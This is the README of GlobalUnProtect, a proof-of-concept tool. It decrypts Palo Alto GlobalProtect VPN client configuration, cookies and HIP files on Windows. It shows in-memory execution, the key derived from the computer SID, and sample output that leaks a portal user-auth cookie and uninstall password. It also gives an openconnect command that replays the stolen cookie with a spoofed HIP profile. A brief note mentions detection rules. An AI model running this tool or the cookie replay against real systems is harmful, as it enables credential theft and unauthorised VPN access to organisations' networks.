# GlobalUnProtect

PoC tool for decrypting and collecting GlobalProtect configuration, cookies, and HIP files from windows client installations. 

Blog post: https://rotarydrone.medium.com/4a1d8fc7773e

## Usage

Run as standalone or in-memory via execute-assembly or equivalent. Collects all contents to an in-memory zip and writes to specified location.

```
> GlobalUnProtect.exe
Usage: GlobalUnProtect.exe C:\Path\To\Output.zip
```

```
> GlobalUnProtect.exe %TEMP%\GPUnprotect.zip
[*] Deriving AES key from computer SID
        [*] Computer SID (Hex) : 010400000000000515000000EFC8897F22AF1E09042DC851
        [*] Derived AES Key: C41006BCDBEF6683B2E7387EA9487A77C41006BCDBEF6683B2E7387EA9487A77
[*] Starting search for GlobalProtect data files
        [*] Found: C:\Users\User\AppData\Local\Palo Alto Networks\GlobalProtect\PanPCD_2ab96390c7dbe3439de74d0c9b0b1767.dat
        [*] Found: C:\Users\User\AppData\Local\Palo Alto Networks\GlobalProtect\PanPortalCfg_2ab96390c7dbe3439de74d0c9b0b17676.dat
        [*] Found: C:\Users\User\AppData\Local\Palo Alto Networks\GlobalProtect\PanPUAC_2ab96390c7dbe3439de74d0c9b0b1767.dat
[*] PanPortalCfg_2ab96390c7dbe3439de74d0c9b0b1767.dat looks like a portal config file, parsing for convenience:
        [*] User Name: example\user
        [*] Portal: vpn.example.com
        [*] User Domain: example
        [*] Portal Name: 
        [*] Tenant Id: 100001
        [*] Uninstall password: uninstall-password
        [*] Portal Pre-logon Cookie: empty
        [*] Portal User-auth Cookie: NzFkZjM0NGJlNjQ0NGEyMzQyMDQ4MmY3ZWE1ZWY1Y2ZhN2FiNTEyNDg0OTJhNWI0NTlhNjkzZjNmMDE2MTYzNzAyMjAzNWE2MGY0Y2I0YmVlMWIyNzExNGYzMTQwYTA5YTY3MTFjNDQ2MmQ3MjQ4NTE5MDEzYzU1OWQ4MzgwYjU=
[*] Collecting HIP profile data files
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_AM_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_BC_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_DE_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_DLP_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_FW_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HIP_PM_Report_V4.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\HipPolicy.dat
        [*] Found: C:\Program Files\Palo Alto Networks\GlobalProtect\PanGpHip.log
[*] Writing output ZIP file to C:\Users\User\AppData\Local\Temp\GPUnprotect.zip
```

Connect via OpenConnect: 

```
$ sudo openconnect --protocol=gp --user="example\\username" --usergroup=portal:portal-userauthcookie --os=win https://vpn.example.com --csd-wrapper ~/tools/custom-hips-profile.sh
```


## Countermeasures

Yara and Sigma rules provided this repo are specific to the tool and behaviors observed when replaying cookies using OpenConnect.